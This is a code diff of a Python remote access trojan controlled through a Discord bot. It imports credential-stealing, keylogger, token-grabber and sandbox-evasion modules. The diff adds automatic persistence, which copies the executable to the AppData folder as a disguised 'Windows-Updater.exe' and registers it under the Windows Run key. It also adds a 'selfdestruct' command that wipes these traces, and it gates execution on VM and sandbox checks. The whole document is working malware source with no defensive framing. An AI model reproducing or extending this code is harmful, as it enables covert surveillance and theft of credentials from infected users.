@@ -17,7 +17,6 @@ from multiprocessing import Process
 import threading
 import json
 import ctypes
-import re
 from ctypes.wintypes import HKEY
 import time
 from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
@@ -26,10 +25,10 @@ import win32process
 import win32pdh
 from winreg import *
 from ctypes import *
-import ctypes
-from libraries import credentials,keylogger,tokengrabber, sandboxevasion
+from libraries import credentials,keylogger,tokengrabber,sandboxevasion
 
 KEYLOG = {KEYLOG}
+PERSISTENT = {PERSISTENT}
 
 BOT_TOKEN = "{BOT_TOKEN}"
 TOKEN_WEBHOOK = "{TOKEN_WEBHOOK}"
@@ -41,6 +40,12 @@ AGENT_ONLINE_ID = {AGENT_ONLINE_ID}
 CREDENTIALS_ID = {CREDENTIALS_ID}
 
 client = commands.Bot(command_prefix="!", intents=discord.Intents.all(), help_command=None)
+
+def autoPersistent():
+    backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
+    if not os.path.exists(backdoor_location):
+        shutil.copyfile(sys.executable, backdoor_location)
+        sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)
 
 def isVM():
     rules = ['Virtualbox', 'vmbox', 'vmware']
@@ -303,10 +308,10 @@ async def creds(context):
 @client.command(name='persistent')
 async def persistent(context):
     try:
-        update_location = os.environ["appdata"] + "\\update_v2.exe"
-        if not os.path.exists(update_location):
-            shutil.copyfile(sys.executable, update_location)
-            sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + update_location + '"', shell=True)
+        backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
+        if not os.path.exists(backdoor_location):
+            shutil.copyfile(sys.executable, backdoor_location)
+            sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)
             my_embed = discord.Embed(title=f"Persistent update created on Agent#{ID}", color=0x00FF00)
             await context.message.channel.send(embed=my_embed)
         else:
@@ -374,6 +379,28 @@ async def terminate(context):
     else:
         pass
 
+@client.command(name='selfdestruct')
+async def selfdestruct(context):
+    command = context.message.content.replace("!selfdestruct ", "")
+    word_list = command.split()
+    if word_list[0] == str(ID):
+        try:        
+            update_location = os.environ["appdata"] + "\\Windows-Updater.exe"
+            config_location = fr'C:\Users\{USERNAME}\.config'
+            if os.path.exists(update_location):
+                os.remove(update_location)
+            if os.path.exists(config_location):
+                shutil.rmtree(config_location)
+            sp.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f', shell=True)
+            my_embed = discord.Embed(title=f"Self-Destruction on Agent#{ID} Completed Succesfully", color=0x00FF00)
+            await context.message.channel.send(embed=my_embed)
+            await client.close()        
+            exit()
+
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error while removing Agent#{ID} persistence:\n{e}", color=0xFF0000)
+            await context.message.channel.send(embed=my_embed)
+
 @client.event
 async def on_ready():
     channel = client.get_channel(AGENT_ONLINE_ID)
@@ -402,7 +429,6 @@ if sandboxevasion.test() == True and isVM() == False:
     createUploads()
     ISADMIN = isAdmin()
 
-
     try:
         path = fr"C:\Users\{USERNAME}\.config\ID"
         with open(path, "r+") as IDfile:
@@ -430,7 +456,9 @@ if sandboxevasion.test() == True and isVM() == False:
                 color = 0x0000FF
 
     if KEYLOG:  
-        threading.Thread(target=keylogs).start() 
+        threading.Thread(target=keylogs).start()
+    if PERSISTENT:
+        autoPersistent()
 
     client.run(BOT_TOKEN)
 else:
